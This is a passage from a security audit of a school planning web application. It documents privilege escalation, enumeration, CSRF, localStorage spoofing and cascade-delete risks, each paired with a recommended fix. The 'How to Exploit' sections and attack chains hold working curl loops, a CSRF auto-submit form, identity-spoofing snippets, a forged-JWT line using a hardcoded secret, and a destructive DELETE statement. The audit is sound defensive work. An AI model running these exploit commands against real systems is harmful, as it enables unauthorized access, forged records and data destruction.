**CWE:** CWE-269 — Improper Privilege Management

#### Description

The registration endpoint accepts the `role` field directly from the request body and stores it in the database with no validation against an allowed list:

```ts
const { email, password, role, name, school_id } = body;
const user = await prisma.user.create({
  data: { email, password: hashedPassword, role, name, school_id }
});
```

The Prisma schema uses a raw string type for `role`, not a constrained enum — meaning any string value is accepted.

#### How to Exploit

An attacker can self-register with any role value:

```bash
# Register with "Division Personnel" role — gaining elevated read access
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@x.com", "password": "password123", "role": "Division Personnel", "name": "Hacker", "school_id": null}'

# Register with a hypothetical future admin role
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker2@x.com", "password": "password123", "role": "SuperAdmin", "name": "Hacker", "school_id": null}'
```

The JWT token issued upon login would embed this self-assigned role. Any future middleware or authorization check that trusts the `role` claim from the token would grant attacker-chosen privileges.

#### Impact

- Anyone can self-assign "Division Personnel" role, gaining cross-school read access
- If admin/superadmin roles are added in future, this attack path is already open
- The registration endpoint is currently an open self-service API (no admin approval flow)

#### Recommendation

1. Validate role against an explicit whitelist on the server:
   ```ts
   const ALLOWED_ROLES = ['School'];  // Only allow self-registration as School
   if (!ALLOWED_ROLES.includes(role)) {
     return c.json({ error: 'Invalid role' }, 400);
   }
   ```
2. Division Personnel and admin roles should only be assignable by an existing admin through a separate privileged endpoint
3. Consider adding a Prisma enum for `role` to enforce at the database level

---

### VULN-15: Sensitive PII Embedded in JWT Payload

**Severity:** Medium
**File:** `server/routes/auth.ts` — lines 52–53
**CWE:** CWE-359 — Exposure of Private Personal Information to an Unauthorized Actor

#### Description

The JWT payload includes more than just identity claims:

```ts
const token = jwt.sign(
  {
    id: user.id,
    email: user.email,
    role: user.role,
    school_id: user.school_id,
    school_name: user.school?.name,   // unnecessary — PII leak
    name: user.name                    // unnecessary — PII leak
  },
  JWT_SECRET,
  { expiresIn: '24h' }
);
```

JWT tokens are base64-encoded, not encrypted. The payload is fully readable by anyone who intercepts the token or reads it from `localStorage`:

```js
// Anyone can decode a JWT without the secret
JSON.parse(atob(token.split('.')[1]))
// Returns: { id: 1, email: "teacher@school.edu.ph", role: "School",
//            school_id: 3, school_name: "Guihulngan Central School",
//            name: "Maria Santos", iat: ..., exp: ... }
```

#### Impact

- Teacher names and school affiliations are embedded in tokens stored in browser memory
- Tokens logged in server access logs, browser history, or shared in error reports expose PII
- Violates data minimization principles

#### Recommendation

Keep JWT payload minimal — only include what is needed for authorization decisions:

```ts
const token = jwt.sign(
  { id: user.id, role: user.role, school_id: user.school_id },
  JWT_SECRET,
  { expiresIn: '24h' }
);
```

Fetch user display information (name, school name) from a protected `/api/me` endpoint after login.

---

### VULN-16: Verbose Error Responses and Enumeration Risk

**Severity:** Medium
**File:** `server/routes/auth.ts` — lines 43–45
**CWE:** CWE-203 — Observable Discrepancy

#### Description

The login endpoint returns different HTTP status codes and messages for "user not found" vs "wrong password." While both currently return `401`, the structure allows future differentiation. More critically, the AIP and PIR creation endpoints return messages that include the exact input value when an entity is not found:

```ts
// data.ts line 217
return c.json({ error: `Program '${program_title}' not found` }, 404);

// data.ts line 279
return c.json({ error: `School '${school_name}' not found` }, 404);
```

This confirms to an attacker whether their guessed program title or school name is valid.

#### How to Exploit

```bash
# Enumerate valid school names by checking for 404 vs 200
for name in "School A" "School B" "Guihulngan Central School"; do
  curl -s -X POST http://localhost:3001/api/pirs \
    -d "{\"school_name\": \"$name\", ...}" | grep -q "not found" && echo "$name: NOT FOUND" || echo "$name: VALID"
done
```

#### Impact

- Confirms existence of specific school names and program titles
- Useful reconnaissance for more targeted attacks

#### Recommendation

Return generic error messages that do not reflect the input:

```ts
// Instead of: `Program '${program_title}' not found`
return c.json({ error: 'Resource not found' }, 404);
```

---

### VULN-17: No Email Format Validation or Verification

**Severity:** Medium
**File:** `server/routes/auth.ts` — line 10
**CWE:** CWE-20 — Improper Input Validation

#### Description

Email addresses are accepted at registration without format validation or any verification step:

```ts
const { email, password, role, name, school_id } = body;
// 'email' is never validated before passing to Prisma
```

#### How to Exploit

```bash
# Register with completely invalid email — account is created successfully
curl -X POST http://localhost:3001/api/auth/register \
  -d '{"email": "not-an-email", "password": "password123", "role": "School", "name": "Test", "school_id": 1}'

# Register with empty email
curl -X POST http://localhost:3001/api/auth/register \
  -d '{"email": "", "password": "password123", "role": "School", "name": "Test", "school_id": 1}'

# Register with SQL-like string as email
curl -X POST http://localhost:3001/api/auth/register \
  -d '{"email": "x'\''OR'\''1'\''='\''1", "password": "x", "role": "School", "name": "x", "school_id": 1}'
```

#### Impact

- Accounts created with invalid emails cannot receive password reset notifications
- Database may contain junk or duplicate-seeming records
- Potential for storing special characters that cause display issues

---

### VULN-22: Open Registration Endpoint — No Admin Gate

**Severity:** Medium
**File:** `server/routes/auth.ts` — lines 9–32
**CWE:** CWE-284 — Improper Access Control

#### Description

The `POST /api/auth/register` endpoint is fully public. Anyone on the internet (or local network) can create unlimited user accounts without any invitation, approval workflow, or admin authorization. There is no CAPTCHA, no email verification, and no registration code or invite token.

For a government education system where accounts represent real schools and officials, self-service open registration is a significant risk — it allows anonymous actors to create personas within the system.

```ts
// auth.ts — registration is wide open
authRoutes.post('/register', async (c) => {
  const body = await c.req.json();
  const { email, password, role, name, school_id } = body;
  // No invite check, no admin approval, no CAPTCHA
  const user = await prisma.user.create({ data: { ... } });
});
```

#### How to Exploit

```bash
# Create 1000 fake accounts in a loop — no barriers
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:3001/api/auth/register \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"fake${i}@bogus.com\", \"password\": \"password123\", \"role\": \"School\", \"name\": \"Fake User ${i}\", \"school_id\": ${i}}"
done

# Register an account tied to a specific school that already has a real user
# The school_id unique constraint on User will block a second School user per school,
# BUT the attacker can create Division Personnel accounts at will (no school_id required)
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "fake@x.com", "password": "p", "role": "Division Personnel", "name": "Intruder"}'
```

Combined with VULN-14 (arbitrary role), an attacker can self-register as Division Personnel and immediately gain elevated access.

#### Impact

- Unlimited fake accounts pollute the user table
- Attackers can create accounts with valid school_id to impersonate schools (blocked only by the unique constraint, which returns a revealing error)
- No way to distinguish legitimate from fraudulent accounts without an audit trail
- Resource exhaustion via mass registration (no rate limiting per VULN-11)

#### Recommendation

1. Remove the public registration endpoint entirely. Create accounts through an admin panel or CLI tool only.
2. If self-registration is needed, implement an **invite-code** or **admin approval** workflow:
   ```ts
   const { invite_code, email, password, ... } = body;
   const invite = await prisma.invite.findUnique({ where: { code: invite_code } });
   if (!invite || invite.used) return c.json({ error: 'Invalid invite' }, 403);
   ```
3. Add CAPTCHA (e.g., hCaptcha) to prevent automated registration
4. Send a verification email before activating the account

---

### VULN-23: Frontend Never Sends Token — Auth Header Absent on All API Calls

**Severity:** Medium
**File:** `react-app/src/AIPForm.jsx`, `react-app/src/PIRForm.jsx`, `react-app/src/App.jsx` — all axios calls
**CWE:** CWE-306 — Missing Authentication for Critical Function (Client Side)

#### Description

The frontend stores the JWT token in `localStorage` after login, but **never attaches it to any subsequent API request**. Every `axios.get()` and `axios.post()` call in the entire frontend is unauthenticated:

```js
// AIPForm.jsx line 93 — no Authorization header
const response = await axios.get(`${import.meta.env.VITE_API_URL}/api/programs`);

// AIPForm.jsx line 206 — no Authorization header
await axios.post(`${import.meta.env.VITE_API_URL}/api/drafts`, { user_id: user.id, ... });

// AIPForm.jsx line 317 — no Authorization header
await axios.post(`${import.meta.env.VITE_API_URL}/api/aips`, { school_id: user.school_id, ... });

// PIRForm.jsx line 330 — no Authorization header
await axios.post(`${import.meta.env.VITE_API_URL}/api/pirs`, { ... });
```

No `Authorization: Bearer <token>` header is set. No axios interceptor is configured. The token is stored but never used.

#### How to Exploit

This is less of an exploit and more of a **systemic design gap**: even when server-side auth middleware is added (to fix VULN-01), the frontend will immediately break because it doesn't send the token. This also means:

- The `ProtectedRoute` component in `App.jsx` checks for a token in localStorage to control route access, but this is purely cosmetic — the API calls themselves are unauthenticated
- An attacker can replicate all frontend functionality with plain `curl` commands (no token needed)
- The `user.id` and `user.school_id` values used in API calls come from localStorage, which is attacker-modifiable via browser console:
  ```js
  // Impersonate any user by modifying localStorage
  localStorage.setItem('user', JSON.stringify({ id: 999, school_id: 5, role: "Division Personnel" }));
  ```

#### Impact

- The entire authentication model is cosmetic — the token is decorative
- When server-side auth is added, every API call in the frontend will return 401 until an axios interceptor is configured
- Client-side identity (user.id, school_id) is trivially spoofable via localStorage manipulation

#### Recommendation

Configure a global axios interceptor to attach the token to every request:

```js
// In main.jsx or a shared api.js module
import axios from 'axios';

axios.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

axios.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('token');
      localStorage.removeItem('user');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);
```

---

### VULN-24: Unsafe JSON.parse on localStorage Without Error Handling

**Severity:** Medium
**File:** `react-app/src/App.jsx` — lines 51, 107, 303; `react-app/src/AIPForm.jsx` — line 30; `react-app/src/PIRForm.jsx` — line 21; `react-app/src/components/ui/FormHeader.jsx` — line 8
**CWE:** CWE-20 — Improper Input Validation

#### Description

Multiple components read and parse user data from localStorage without error handling:

```js
// App.jsx:51 — PIRRouteGuard
const userStr = localStorage.getItem('user');
const user = userStr ? JSON.parse(userStr) : null;  // no try-catch

// App.jsx:107 — Dashboard
const user = userStr ? JSON.parse(userStr) : null;

// AIPForm.jsx:30
const user = userStr ? JSON.parse(userStr) : null;

// App.jsx:303 — handleConfirmSubmit
const user = JSON.parse(localStorage.getItem('user') || '{}');
```

If the `user` localStorage value is corrupted (by a browser extension, XSS payload, or manual tampering), `JSON.parse` throws a `SyntaxError` that is uncaught, crashing the React component tree.

#### How to Exploit

```js
// In browser console — crash the entire app on next page load
localStorage.setItem('user', 'not-valid-json{{{');
location.reload();
// Result: Uncaught SyntaxError in every component that parses 'user'
// App renders a white screen or React error boundary
```

More dangerously, an attacker who has XSS access can inject a malicious user object that modifies application behavior:

```js
// Inject a fake user identity — the app will use these values for all API calls
localStorage.setItem('user', JSON.stringify({
  id: 1,
  school_id: 999,
  role: "Division Personnel",
  name: "Fake Admin",
  school_name: "Attacker School"
}));
```

Since the backend doesn't validate the token (VULN-01 + VULN-23), these spoofed values are sent to the API and trusted.

#### Impact

- Application crashes on corrupted localStorage (denial of service)
- Client-side identity spoofing by manipulating the stored user object
- Combined with VULN-01 and VULN-23, this allows complete identity impersonation from the browser

#### Recommendation

1. Wrap all `JSON.parse` calls in try-catch:
   ```js
   function getStoredUser() {
     try {
       const str = localStorage.getItem('user');
       return str ? JSON.parse(str) : null;
     } catch {
       localStorage.removeItem('user');
       localStorage.removeItem('token');
       return null;
     }
   }
   ```
2. Never trust localStorage values for authorization decisions — always derive identity from the server-verified JWT token

---

## Low Severity Vulnerabilities

---

### VULN-18: No CSRF Protection

**Severity:** Low
**File:** `server/server.ts`
**CWE:** CWE-352 — Cross-Site Request Forgery

#### Description

There are no CSRF tokens or `SameSite` cookie attributes applied to state-changing requests. While `localStorage`-based tokens provide *some* protection (they aren't automatically sent by the browser like cookies), if this system is later migrated to HttpOnly cookies, CSRF becomes exploitable.

#### How to Exploit (when cookies are used)

```html
<!-- attacker.html — visited by a logged-in school administrator -->
<form action="http://localhost:3001/api/aips" method="POST" enctype="text/plain">
  <input name='{"school_id":5,"program_title":"Regular","year":2026,' value='"outcome":"Forged"}'>
</form>
<script>document.forms[0].submit();</script>
```

The browser automatically sends the victim's session cookie. The server receives a valid authenticated request with attacker-controlled data.

#### Recommendation

- Use `SameSite=Strict` on session cookies
- Implement double-submit cookie pattern or synchronizer token pattern for CSRF protection

---

### VULN-19: Missing Security Response Headers

**Severity:** Low
**File:** `server/server.ts`
**CWE:** CWE-693 — Protection Mechanism Failure

#### Description

The server does not set standard defensive HTTP headers:

```
X-Content-Type-Options: nosniff         — missing
X-Frame-Options: DENY                   — missing
Referrer-Policy: no-referrer            — missing
Permissions-Policy: ...                 — missing
```

#### Impact

- Without `X-Content-Type-Options`, browsers may MIME-sniff responses as executable content
- Without `X-Frame-Options`, the app could be embedded in an `<iframe>` for clickjacking attacks

#### Recommendation

Add a security headers middleware to Hono:

```ts
app.use('*', async (c, next) => {
  await next();
  c.res.headers.set('X-Content-Type-Options', 'nosniff');
  c.res.headers.set('X-Frame-Options', 'DENY');
  c.res.headers.set('Referrer-Policy', 'no-referrer');
});
```

---

### VULN-20: No Content Security Policy

**Severity:** Low
**File:** `server/server.ts` / frontend
**CWE:** CWE-693 — Protection Mechanism Failure

#### Description

No `Content-Security-Policy` header is set on the frontend. This means browsers will execute any JavaScript from any source, amplifying the impact of any XSS finding.

#### Recommendation

Add a CSP header through the web server serving the React frontend:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' http://localhost:3001;
```

---

### VULN-21: No Audit Logging

**Severity:** Low
**File:** All route handlers
**CWE:** CWE-778 — Insufficient Logging

#### Description

No audit trail is maintained for sensitive operations. There is no record of who logged in, who created/modified which AIP or PIR, or who accessed draft data.

#### Impact

- Impossible to detect unauthorized access after the fact
- Cannot attribute forged submissions to a specific account
- No forensic trail for incident response

#### Recommendation

Log at minimum: timestamp, user ID, action, target resource, and outcome for all authentication events and all AIP/PIR creation or modification events. Store logs separately from application data so they cannot be wiped via application-level access.

---

### VULN-25: Deno Permission Flags Missing --allow-write

**Severity:** Low
**File:** `server/deno.json` — lines 4–5
**CWE:** CWE-276 — Incorrect Default Permissions

#### Description

The Deno task commands for `start` and `dev` do not include the `--allow-write` permission flag:

```json
{
  "tasks": {
    "start": "deno run --env --allow-net --allow-env --allow-read --allow-sys server.ts",
    "dev": "deno run --watch --env --allow-net --allow-env --allow-read --allow-sys server.ts"
  }
}
```

However, the draft system in `data.ts` calls `Deno.writeTextFile()` (line 44), `Deno.remove()` (line 119), and `ensureDir()` (line 22) — all of which require `--allow-write`. This creates one of two scenarios:

1. **Deno prompts interactively** at runtime when a write is attempted — this blocks the event loop in production, causing the request to hang indefinitely
2. **Deno denies the write** — drafts silently fail to save, and users lose their work without an error message (the catch block returns a generic 500)

The seed script uses `-A` (allow all permissions), which is the opposite extreme — it runs with zero sandboxing.

#### Impact

- Draft save/load/delete may silently fail in production if Deno denies write
- Operational stability risk — server could hang waiting for an interactive permission prompt
- The `seed.ts` script running with `-A` bypasses all of Deno's security sandbox

#### Recommendation

Add `--allow-write=data/drafts` to the task commands to grant scoped write access:

```json
"start": "deno run --env --allow-net --allow-env --allow-read --allow-write=data/drafts --allow-sys server.ts"
```

For the seed script, scope permissions instead of using `-A`:

```json
"seed": "deno run --env --allow-net --allow-env --allow-read scripts/seed.ts"
```

---

### VULN-26: Aggressive Cascade Deletes — No Soft Delete or Archive

**Severity:** Low
**File:** `server/prisma/schema.prisma` — lines 32, 81, 103, 123, 137, 155, 156, 169
**CWE:** CWE-404 — Improper Resource Shutdown or Release

#### Description

Almost every relation in the Prisma schema uses `onDelete: Cascade`. The cascade chain is:

```
School (delete) → AIP (cascade)
  AIP (delete) → AIPActivity (cascade)
  AIP (delete) → PIR (cascade)
    PIR (delete) → PIRActivityReview (cascade)
    PIR (delete) → PIRFactor (cascade)
    AIPActivity (delete) → PIRActivityReview (cascade)
User (delete) → Draft (cascade)
Cluster (delete) → School (cascade) → ... (everything above)
```

Deleting a single **Cluster** record would cascade-destroy every School in that cluster, every AIP, every PIR, every activity, every review, and every factor — potentially hundreds of records of official government planning data.

#### How to Exploit

While there is no DELETE endpoint currently exposed, this becomes dangerous if:
1. An admin tool or future endpoint performs a delete
2. The database is accessed directly (via credentials from VULN-08)
3. A Prisma migration accidentally triggers a re-create

```sql
-- A single SQL statement wipes all data for an entire cluster
DELETE FROM clusters WHERE id = 1;
-- Cascades through schools → AIPs → PIRs → reviews → factors
-- Potentially hundreds of official planning records destroyed
```

#### Impact

- Accidental data destruction through cascading deletes
- No recovery mechanism — deleted records are gone permanently
- No historical record of previous planning cycles
- Regulatory/compliance risk for government data retention requirements

#### Recommendation

1. Replace `onDelete: Cascade` with `onDelete: Restrict` on critical relations (AIP → School, PIR → AIP) to prevent accidental cascade:
   ```prisma
   school School @relation(fields: [school_id], references: [id], onDelete: Restrict)
   ```
2. Implement soft deletes using a `deleted_at` timestamp column
3. Add database backups as a safeguard

---

### VULN-27: Expired JWT Never Invalidated on the Client

**Severity:** Low
**File:** `react-app/src/App.jsx` — lines 37–42
**CWE:** CWE-613 — Insufficient Session Expiration

#### Description

The `ProtectedRoute` component checks only whether a token *exists* in localStorage — not whether it is still valid:

```js
const ProtectedRoute = ({ children }) => {
  const token = localStorage.getItem('token');
  if (!token) {
    return <Navigate to="/login" replace />;
  }
  return children;  // token could be expired — doesn't matter
};
```

The JWT has a 24-hour expiration (`{ expiresIn: '24h' }` in `auth.ts`), but the frontend never checks the `exp` claim. Once a token expires:

- The user continues to see the authenticated UI (dashboard, forms)
- All API calls fail with 401 (once auth middleware is added)
- The user sees confusing "Submission Failed" errors instead of being redirected to login
- The token remains in localStorage indefinitely until the user manually logs out

#### Impact

- Poor user experience after token expiry — the app appears broken instead of redirecting to login
- Stale sessions linger — if a device is shared, the next person sees the previous user's dashboard
- No proactive session cleanup

#### Recommendation

Check token expiration on the client before rendering protected routes:

```js
const ProtectedRoute = ({ children }) => {
  const token = localStorage.getItem('token');
  if (!token) return <Navigate to="/login" replace />;

  try {
    const payload = JSON.parse(atob(token.split('.')[1]));
    if (payload.exp * 1000 < Date.now()) {
      localStorage.removeItem('token');
      localStorage.removeItem('user');
      return <Navigate to="/login" replace />;
    }
  } catch {
    localStorage.removeItem('token');
    return <Navigate to="/login" replace />;
  }

  return children;
};
```

Also add an axios response interceptor to catch 401s and redirect (see VULN-23 recommendation).

---

### VULN-28: Dev Utility Functions Ship in Production Bundle

**Severity:** Low
**File:** `react-app/src/PIRForm.jsx` — lines 198–212
**CWE:** CWE-489 — Active Debug Code

#### Description

The PIR form contains a `fillDevData()` function that auto-populates the form with test data:

```js
// PIRForm.jsx line 198
const fillDevData = () => {
    setProgram(programList[0] || "Alternative Learning System (ALS)");
    setSchool(schoolList[0] || "Guihulngan National High School");
    setOwner("Jane Doe");
    setFundSource("MOOE");
    setRawBudget("250000");
    setActivities([
        { id: crypto.randomUUID(), name: "Conduct Q1 Training", physTarget: "50", ... },
        { id: crypto.randomUUID(), name: "Procure Learning Materials", ... }
    ]);
    // ... fills factors with test data
};
```

The button that triggers this function is conditionally rendered behind `import.meta.env.DEV`:

```js
{!isMobile && import.meta.env.DEV && (
  <button onClick={fillDevData}>Dev: Fill Data</button>
)}
```

However, while the **button** is tree-shaken in production, the **function definition itself** remains in the production JavaScript bundle. React component functions are not dead-code-eliminated by Vite/Rollup because they're closures referenced in the component scope.

#### How to Exploit

```js
// In production, open browser DevTools on the PIR form page
// The fillDevData function is accessible through React DevTools or by
// inspecting the component's internal state hooks.
// More practically, an attacker can replicate what fillDevData does by
// simply examining the minified bundle — it reveals:
//   - Valid program names ("Alternative Learning System (ALS)")
//   - Valid school names ("Guihulngan National High School")
//   - Budget field names and data structure
//   - Activity data schema
```

This leaks the internal data schema and real entity names to anyone who reads the production JS bundle.

#### Impact

- Production bundle contains test data with real school and program names
- Reveals internal data structures that aid in crafting API payloads (helps with VULN-01 and VULN-06)
- Minor code bloat

#### Recommendation

Move dev-only utilities behind a truly compile-time conditional, or extract them into a separate file that's excluded from the production build:

```js
// In vite.config.js — define a compile-time flag
define: {
  __DEV__: JSON.stringify(process.env.NODE_ENV !== 'production')
}

// In PIRForm.jsx — entire block removed at build time
if (__DEV__) {
  var fillDevData = () => { ... };
}
```

Or simply delete `fillDevData` and the dev button — use browser extensions or Storybook for form testing instead.

---

## Attack Chains

The vulnerabilities above are not isolated — several can be chained together for maximum impact without any credentials.

---

### Attack Chain 1: Full Unauthenticated Data Exfiltration (VULN-01 + VULN-05)

**Attacker:** External, unauthenticated, only needs network access to port 3001
**Time to execute:** Under 5 minutes

```
1. Query GET /api/schools         → get all school IDs and names
2. Query GET /api/clusters        → get organizational structure
3. Query GET /api/programs        → get all available programs
4. For each school ID:
   Query GET /api/schools/{id}/aip-status?year=2026
   → determine submission status of every school
5. For user IDs 1–100:
   Query GET /api/drafts/AIP/{id}
   → collect all in-progress draft data (budgets, plans, personnel)
```

**Result:** Complete read of all institutional planning data, submission status, and in-progress work — with zero credentials.

---

### Attack Chain 2: Forge AIP Submission + Delete Draft (VULN-01 + VULN-03 + VULN-02)

**Attacker:** External, unauthenticated
**Time to execute:** Under 10 minutes

```
1. GET /api/schools → identify target school (e.g., school_id=5, name="Target School")
2. GET /api/programs → get valid program titles
3. POST /api/aips with school_id=5, forged activity data
   → A fake AIP is now attributed to school 5
4. This triggers /api/schools/5/aip-status to return hasAIP=true
   → The school's PIR form is now "unlocked" in the real user's UI
5. POST /api/pirs with school_name="Target School"
   → A fake quarterly review is submitted under the school's identity
6. DELETE /api/drafts/AIP/5
   → The school's real in-progress draft is destroyed
```

**Result:** A forged AIP and PIR are on record. The school's real draft is gone. The school appears to have submitted when they have not — or their real data is replaced with false data.

---

### Attack Chain 3: Escalate to Division Personnel + Access Cross-School Data (VULN-14 + VULN-04)

**Attacker:** Has read access to source code (e.g., via VULN-10 or leaked git repository)
**Time to execute:** Under 15 minutes

```
1. Read source code → learn the default JWT_SECRET from auth.ts line 7
2. POST /api/auth/register with role="Division Personnel"
   → Account created with elevated role
3. POST /api/auth/login
   → Receive JWT token embedding "Division Personnel" role
4. (After auth middleware is added) Use token to access cross-school aggregate views
5. OR: Forge a Division Personnel token directly using the known JWT_SECRET:
   jwt.sign({id:999, role:"Division Personnel"}, "super-secret-default-key-change-me-in-production")
```

**Result:** Full division-level access without ever interacting with a real admin account.

---

### Attack Chain 4: Client-Side Identity Spoofing → Full Impersonation (VULN-23 + VULN-24 + VULN-01)

**Attacker:** Any user with browser DevTools access (including a legitimate but malicious school user)
**Time to execute:** Under 2 minutes

```
1. Open browser DevTools console on any page of the app
2. Inject a spoofed user identity:
   localStorage.setItem('user', JSON.stringify({
     id: 1, school_id: 5, role: "Division Personnel",
     name: "Division Chief", school_name: "Any School"
   }));
3. Reload the page — the app now renders the attacker as "Division Chief"
4. Navigate to /aip — the form pre-fills school_id=5 from the spoofed user
5. Submit the AIP — the backend receives school_id=5 with no validation
   (no Authorization header is sent per VULN-23, no auth check per VULN-01)
6. Navigate to /pir — unlock bypass via:
   localStorage.setItem('dev_pir_unlocked', 'true');
7. Submit a PIR for any school — the backend trusts the school_name from the body
```

**Result:** A user impersonating any school can submit both AIP and PIR documents under that school's identity, using only browser DevTools. No network interception, no external tools, no credentials needed beyond initial login to reach the app.

---

### Attack Chain 5: Mass Account Creation + Data Pollution (VULN-22 + VULN-14 + VULN-01)

**Attacker:** External, unauthenticated, automated script
**Time to execute:** Under 5 minutes

```
1. Script creates 50 Division Personnel accounts via POST /api/auth/register
   (open registration, no role validation, no rate limit, no CAPTCHA)
2. Each account logs in and receives a valid JWT (not needed currently, but future-proofing)
3. For each of the ~50 schools in the system:
   POST /api/aips with fabricated activity data
   → 50 fake AIP records created
4. For each fake AIP:
   POST /api/pirs with fabricated quarterly reviews
   → 200 fake PIR records created (4 quarters × 50 schools)
5. Result: The database is polluted with 250 forged official documents
   that are indistinguishable from legitimate submissions
```

**Result:** The entire quarterly reporting system is rendered untrusted. Division office cannot determine which submissions are real. Recovery requires manual verification with every school — effectively resetting the entire planning cycle.

---

## Remediation Priority Matrix

| Priority | Vulnerability | Effort | Impact |
|----------|--------------|--------|--------|
| P0 — Do immediately | VULN-01: Add auth middleware | Low | Blocks most attacks |
| P0 — Do immediately | VULN-04: Remove JWT secret fallback | Very Low | Blocks token forgery |
| P0 — Do immediately | VULN-05: Restrict CORS origin | Very Low | Limits attack surface |
| P1 — This sprint | VULN-02/03: Fix IDOR on drafts | Low | Blocks data theft/tampering |
| P1 — This sprint | VULN-06: Enforce school ownership | Low | Blocks cross-school forgery |
| P1 — This sprint | VULN-14: Validate role on register | Very Low | Blocks privilege escalation |
| P2 — Next sprint | VULN-07: Input validation on register | Medium | Improves account security |
| P2 — Next sprint | VULN-11: Rate limit auth endpoints | Medium | Blocks brute force |
| P2 — Next sprint | VULN-10: Sanitize file paths | Low | Blocks path traversal |
| P2 — Next sprint | VULN-13: Remove client-side guard bypass | Very Low | Enforces business rules |
| P3 — Backlog | VULN-12: Move token to HttpOnly cookie | Medium | Reduces XSS exposure |
| P3 — Backlog | VULN-08: Rotate DB credentials | Low | Reduces credential exposure |
| P3 — Backlog | VULN-15: Minimize JWT payload | Low | Reduces PII exposure |
| P3 — Backlog | VULN-19/20: Add security headers + CSP | Low | Defense in depth |
| P1 — This sprint | VULN-23: Add Authorization header to frontend | Low | Enables server-side auth |
| P1 — This sprint | VULN-22: Gate registration behind admin/invite | Medium | Blocks account flooding |
| P2 — Next sprint | VULN-24: Wrap JSON.parse in try-catch | Very Low | Prevents app crashes |
| P2 — Next sprint | VULN-25: Add --allow-write=data/drafts | Very Low | Fixes draft persistence |
| P3 — Backlog | VULN-27: Check JWT expiry on client | Low | Fixes stale sessions |
| P3 — Backlog | VULN-28: Remove dev utilities from prod build | Very Low | Reduces info leakage |
| P3 — Backlog | VULN-26: Replace cascade with restrict/soft-delete | Medium | Protects against data loss |
| P4 — Nice to have | VULN-21: Audit logging | High | Forensic capability |
| P4 — Nice to have | VULN-18: CSRF protection | Medium | Needed if cookies adopted |

---

## Recommended Fixes Overview

### 1. Add JWT Middleware to All Data Routes (`server/routes/data.ts`)

```ts
import jwt from "jsonwebtoken";
const JWT_SECRET = Deno.env.get("JWT_SECRET")!;

dataRoutes.use('*', async (c, next) => {
  const header = c.req.header('Authorization');
  if (!header?.startsWith('Bearer ')) return c.json({ error: 'Unauthorized' }, 401);
  try {
    const user = jwt.verify(header.slice(7), JWT_SECRET);
    c.set('user', user);
    await next();
  } catch {
    return c.json({ error: 'Invalid token' }, 401);
  }
});
```

### 2. Derive User Identity From Token, Never From Request (`server/routes/data.ts`)

```ts
// In POST /api/drafts — replace:
const { user_id, form_type, draft_data } = await c.req.json();
// With:
const caller = c.get('user');
const user_id = caller.id;
const { form_type, draft_data } = await c.req.json();
```

### 3. Verify Ownership Before Draft Access/Delete

```ts
// In GET and DELETE /api/drafts/:formType/:userId
const caller = c.get('user');
const userId = parseInt(c.req.param('userId'));
if (caller.id !== userId) return c.json({ error: 'Forbidden' }, 403);
```

### 4. Remove JWT Secret Fallback (`server/routes/auth.ts`)

```ts
const JWT_SECRET = Deno.env.get("JWT_SECRET");
if (!JWT_SECRET) throw new Error("JWT_SECRET is not set");
```

### 5. Restrict CORS (`server/server.ts`)

```ts
app.use('*', cors({
  origin: (origin) => {
    const allowed = ['http://localhost:5173'];
    return allowed.includes(origin) ? origin : '';
  }
}));
```

### 6. Validate Role on Registration (`server/routes/auth.ts`)

```ts
const ALLOWED_SELF_REGISTER_ROLES = ['School'];
if (!ALLOWED_SELF_REGISTER_ROLES.includes(role)) {
  return c.json({ error: 'Invalid role' }, 400);
}
```

### 7. Sanitize Draft File Paths Before Use (`server/routes/data.ts`)

```ts
const safePath = path.resolve(draft.file_path);
const safeBase = path.resolve(DRAFTS_DIR);
if (!safePath.startsWith(safeBase + path.sep)) {
  throw new Error('Path traversal detected');
}
await Deno.readTextFile(safePath);
```

### 8. Add Axios Auth Interceptor (`react-app/src/main.jsx` or shared module)

```js
import axios from 'axios';

axios.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

axios.interceptors.response.use(
  (res) => res,
  (err) => {
    if (err.response?.status === 401) {
      localStorage.clear();
      window.location.href = '/login';
    }
    return Promise.reject(err);
  }
);
```

### 9. Safe localStorage Parser (shared utility)

```js
export function getStoredUser() {
  try {
    const str = localStorage.getItem('user');
    return str ? JSON.parse(str) : null;
  } catch {
    localStorage.removeItem('user');
    localStorage.removeItem('token');
    return null;
  }
}
```

### 10. Fix Deno Permissions (`server/deno.json`)

```json
"start": "deno run --env --allow-net --allow-env --allow-read --allow-write=data/drafts --allow-sys server.ts",
"dev": "deno run --watch --env --allow-net --allow-env --allow-read --allow-write=data/drafts --allow-sys server.ts"
```

---

*This document should be treated as a living reference. Re-audit after all P0/P1 fixes are applied. Remove or archive this file before any public deployment of the system.*
